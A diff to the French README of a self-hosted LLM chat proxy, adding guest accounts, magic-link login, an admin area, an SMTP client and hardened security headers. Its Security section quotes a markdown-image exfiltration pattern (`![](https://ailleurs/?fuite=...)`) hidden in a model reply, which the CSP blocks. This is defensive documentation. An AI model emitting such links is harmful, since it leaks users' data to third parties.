@@ -11,6 +11,9 @@ existe parce qu'une réponse de 1000 tokens prend trois minutes.
 ```
 server.js                       proxy + statique + auth, 0 dépendance
 lib/auth.js                     mot de passe, sessions signées, anti brute-force
+lib/users.js                    comptes invités, liens magiques (fichier JSON)
+lib/admin.js                    espace d'administration (rendu serveur)
+lib/mailer.js                   client SMTP minimal, sans dépendance
 lib/security.js                 CSP et en-têtes de sécurité
 lib/login.html                  écran de connexion (HTML + CSS purs, sans JS)
 web/                            front Vite + React + Tailwind -> web/dist
@@ -75,6 +78,13 @@ export APP_PASSWORD_HASH='scrypt$...$...'
 | `SESSION_SECRET`   | auto                    | Clé HMAC des sessions. Générée et persistée dans `~/.llm-chat-session-secret` si absente. |
 | `TRUST_PROXY`      | `0`                     | **Mettre à `1` derrière un reverse proxy** : lit `X-Forwarded-Proto` et `X-Forwarded-For`. |
 | `AUTH_DISABLED`    | `0`                     | `1` désactive l'authentification. À réserver à un binding `127.0.0.1`. |
+| `USERS_FILE`       | `~/.llm-chat-users.json`| Comptes invités. Doit être inscriptible par le service. |
+| `APP_BASE_URL`     | déduit du `Host`        | URL publique, utilisée pour fabriquer les liens magiques. **À définir** : sinon un `Host` forgé fabrique un lien vers un autre domaine. |
+| `SMTP_HOST`        | —                       | Relais d'envoi. Absent = pas d'e-mail, les liens se copient à la main. |
+| `SMTP_PORT`        | `587`                   | `465` bascule en TLS implicite, `587`/`25` en STARTTLS. |
+| `SMTP_USER` / `SMTP_PASS` | —                | Identifiants du relais (AUTH LOGIN). |
+| `SMTP_FROM`        | `SMTP_USER`             | Expéditeur. |
+| `SMTP_FROM_NAME`   | `NULLNODE`              | Nom affiché. |
 | `MAX_BODY_BYTES`   | `1000000`               | Taille max d'une requête `/api`. |
 
 La clé n'atteint jamais le navigateur : le front appelle `/api/*`, le proxy
@@ -206,12 +216,71 @@ Les navigations passent toujours par le réseau en premier, sinon une session
 expirée servirait la coquille en cache au lieu de la redirection vers l'écran
 de connexion.
 
+
+## Comptes et liens magiques
+
+Deux rôles, et un seul moyen de créer un compte : l'administrateur.
+
+- **Administrateur** — se connecte avec le mot de passe maître
+  (`APP_PASSWORD`). C'est le seul à voir `/admin`, accessible depuis la barre
+  latérale du chat. Un invité qui tente l'URL reçoit un 404, pas un 403 :
+  inutile de lui confirmer que la page existe.
+- **Invité** — n'a **pas de mot de passe**. Il reçoit un lien à usage unique,
+  valable 7 jours. Une fois ouvert, la session dure 30 jours sur cet appareil.
+
+L'espace d'administration permet de créer un compte, réémettre ou annuler un
+lien, fermer les sessions ouvertes d'un compte, le désactiver ou le supprimer.
+
+### Envoi des liens
+
+Sans `SMTP_HOST`, le lien s'affiche à l'écran avec un bouton copier : à vous
+de le transmettre. Avec un relais configuré, une case « envoyer par e-mail »
+apparaît et le lien part directement — il n'est alors **pas** réaffiché, pour
+ne pas élargir inutilement sa surface d'exposition.
+
+Le client SMTP est écrit à la main (STARTTLS, `AUTH LOGIN`, sujet encodé en
+RFC 2047, dot-stuffing). Ce n'est pas un MTA : ni file d'attente, ni réessai,
+ni DKIM. Il vise un relais authentifié — Gmail, Fastmail, Mailgun — qui signe
+à sa place. La plupart des hébergeurs bloquent le port 25 sortant : utilisez
+le 587.
+
+Mettez le mot de passe du relais dans `/etc/llm-chat/smtp.env` chargé par
+`EnvironmentFile=`, pas dans l'unité systemd : son contenu est lisible par
+tous les comptes de la machine.
+
+### Ce qui est garanti
+
+- Le secret d'un lien **n'est jamais stocké en clair** : le fichier de comptes
+  ne contient que son empreinte SHA-256. Une copie du fichier ne permet pas de
+  fabriquer un lien valide.
+- Un lien est **à usage unique** et expire au bout de 7 jours.
+- Les tentatives sur un lien invalide comptent dans le même verrou anti
+  brute-force que la page de connexion.
+- Désactiver ou supprimer un compte **ferme immédiatement ses sessions**. Le
+  cookie signé ne suffit pas : chaque requête revalide le compte contre le
+  magasin, sinon un compte révoqué resterait actif pendant les 30 jours de
+  validité du cookie.
+- Réactiver un compte ne rouvre pas les anciennes sessions — il faut réémettre
+  un lien. C'est volontaire.
+- Le fichier de comptes est écrit de façon atomique (`tmp` + `rename`) en 0600.
+
+### Limites
+
+- Le lien transite par le canal que vous choisissez. Envoyé par e-mail, il est
+  aussi sûr que la boîte du destinataire — quiconque lit ce message avant lui
+  prend sa place.
+- Tous les invités partagent le même `llama-server` en `--parallel 1` : à deux
+  utilisateurs actifs, le second reçoit un 429 tant que le premier génère.
+- Pas de quota par utilisateur, pas de journal des conversations côté serveur.
+  Chaque personne garde les siennes dans son propre navigateur.
+- Les comptes invités ne peuvent pas changer d'appareil sans un nouveau lien.
+
 ## Sécurité
 
 Le service est conçu pour être joignable depuis Internet derrière un reverse
 proxy TLS. Ce qui est en place :
 
-- **Authentification par mot de passe** sur *toutes* les routes, y compris les
+- **Authentification obligatoire** sur *toutes* les routes, y compris les
   fichiers statiques : sans session, on ne peut même pas télécharger le bundle.
   Seuls le manifest et les icônes restent publics, pour que l'écran de
   connexion s'affiche et reste installable.
@@ -227,7 +296,9 @@ proxy TLS. Ce qui est en place :
   quitter le site : une réponse du modèle contenant
   `![](https://ailleurs/?fuite=...)` est bloquée par le navigateur. Vérifié :
   image, `fetch`, `<script>` et WebSocket vers un domaine tiers sont tous refusés.
-- **HSTS**, `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`,
+- **Vérification d'origine** sur les POST sensibles (connexion, actions
+  d'administration), en plus de `SameSite=Strict`.
+- **HSTS**, `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: same-origin`,
   `X-Robots-Tag: noindex` et `robots.txt` interdisant l'indexation.
 - **Une seule génération à la fois côté serveur** (429 sinon) et corps de
   requête plafonné : un inconnu ne peut pas saturer le Mac.
@@ -296,7 +367,10 @@ sudo lsof -nP -iTCP:8080 -sTCP:LISTEN                # sur le Mac
 | Front            | Upstream                | |
 |------------------|-------------------------|---|
 | `/auth/login`    | —                       | formulaire HTML, POST `password` |
+| `/auth/magic`    | —                       | consomme un lien à usage unique (`?t=…`) |
+| `/auth/whoami`   | —                       | rôle de la session courante |
 | `/auth/logout`   | —                       | efface le cookie |
+| `/admin`         | —                       | espace d'administration, administrateur seul |
 | `/api/health`    | `/health`               | 200 prêt · 503 modèle en chargement · 502 llama-server absent |
 | `/api/v1/models` | `/v1/models`            | nom du modèle au démarrage |
 | `/api/v1/chat/completions` | idem          | SSE, `stream: true` |
@@ -359,6 +433,11 @@ Marche bien en pratique, mais le modèle peut répéter une phrase à la jointur
 - Le blocage anti brute-force est en mémoire : un redémarrage le remet à zéro.
 - `lib/login.html` est lu une seule fois au démarrage : redémarrez le service
   après l'avoir modifié.
+- `Referrer-Policy` est à `same-origin` et non `no-referrer` : ce dernier
+  pousse Chrome à envoyer `Origin: null` sur les POST de formulaire, ce qui
+  ferait échouer la vérification anti-CSRF et rendrait la connexion
+  impossible. La CSP interdisant toute requête sortante, la confidentialité
+  vis-à-vis des tiers est identique.
 - Le bundle pèse ~160 kB gzip, dominé par `highlight.js` et `react-markdown`.
   Invisible sur le LAN, moins sur un premier chargement en 4G — le service
   worker règle le problème dès la deuxième visite.
